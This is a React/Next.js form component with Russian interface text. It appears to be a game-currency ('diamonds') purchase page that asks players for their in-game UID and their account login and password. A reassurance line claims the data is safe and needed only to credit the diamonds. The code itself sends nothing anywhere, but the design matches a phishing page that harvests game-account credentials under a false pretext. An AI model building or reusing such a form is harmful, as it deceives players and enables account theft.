import React, { useState } from 'react';
import Image from 'next/image';

interface UIDFormProps {
  onSubmit: (data: { uid: string; login: string; password: string }) => void;
}

export default function UIDForm({ onSubmit }: UIDFormProps) {
  const [formData, setFormData] = useState({
    uid: '',
    login: '',
    password: '',
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(formData);
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  return (
    <div className="relative">
      <div className="absolute inset-0 bg-gradient-to-r from-primary/20 via-accent/20 to-primary/20 blur-[100px]"></div>
      
      <form onSubmit={handleSubmit} className="relative max-w-2xl mx-auto">
        <div className="glass-card p-8 shadow-2xl">
          <div className="flex items-center gap-6 mb-8">
            <div className="w-16 h-16 glass-effect rounded-2xl p-3 floating">
              <Image
                src="/diamond-icon.svg"
                alt="Алмазы"
                width={40}
                height={40}
                className="w-full h-full"
              />
            </div>
            <div>
              <h2 className="text-3xl font-bold gradient-text mb-2">
                Данные для покупки
              </h2>
              <p className="text-gray-400">
                Введите данные для завершения покупки
              </p>
            </div>
          </div>
          
          <div className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-medium text-gray-300">
                Ваш UID
              </label>
              <div className="relative">
                <div className="absolute inset-0 bg-gradient-to-r from-primary/20 to-accent/20 blur-lg"></div>
                <input
                  type="text"
                  name="uid"
                  value={formData.uid}
                  onChange={handleChange}
                  placeholder="Введите ваш UID из игры"
                  className="w-full bg-black/30 border border-white/10 rounded-xl px-6 py-4 focus:outline-none focus:border-accent/50 focus:ring-2 focus:ring-accent/20 transition-all duration-300 text-lg relative z-10"
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium text-gray-300">
                Логин аккаунта
              </label>
              <div className="relative">
                <div className="absolute inset-0 bg-gradient-to-r from-primary/20 to-accent/20 blur-lg"></div>
                <input
                  type="text"
                  name="login"
                  value={formData.login}
                  onChange={handleChange}
                  placeholder="Введите логин от аккаунта"
                  className="w-full bg-black/30 border border-white/10 rounded-xl px-6 py-4 focus:outline-none focus:border-accent/50 focus:ring-2 focus:ring-accent/20 transition-all duration-300 text-lg relative z-10"
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium text-gray-300">
                Пароль аккаунта
              </label>
              <div className="relative">
                <div className="absolute inset-0 bg-gradient-to-r from-primary/20 to-accent/20 blur-lg"></div>
                <input
                  type="password"
                  name="password"
                  value={formData.password}
                  onChange={handleChange}
                  placeholder="Введите пароль от аккаунта"
                  className="w-full bg-black/30 border border-white/10 rounded-xl px-6 py-4 focus:outline-none focus:border-accent/50 focus:ring-2 focus:ring-accent/20 transition-all duration-300 text-lg relative z-10"
                />
              </div>
            </div>
            
            <div className="flex items-start gap-4 bg-white/5 rounded-xl p-4">
              <span className="text-2xl">⚠️</span>
              <div>
                <h4 className="font-medium text-white mb-1">Важно!</h4>
                <p className="text-sm text-gray-400">
                  Данные необходимы для зачисления алмазов на ваш аккаунт. Мы гарантируем безопасность ваших данных.
                </p>
              </div>
            </div>
            
            <button
              type="submit"
              className="w-full primary-button py-4 text-lg hover-scale group"
            >
              <span className="relative z-10">Оплатить покупку</span>
              <div className="absolute inset-0 bg-white/10 rounded-xl opacity-0 group-hover:opacity-100 transition-opacity" />
            </button>
          </div>
        </div>
      </form>
    </div>
  );
} 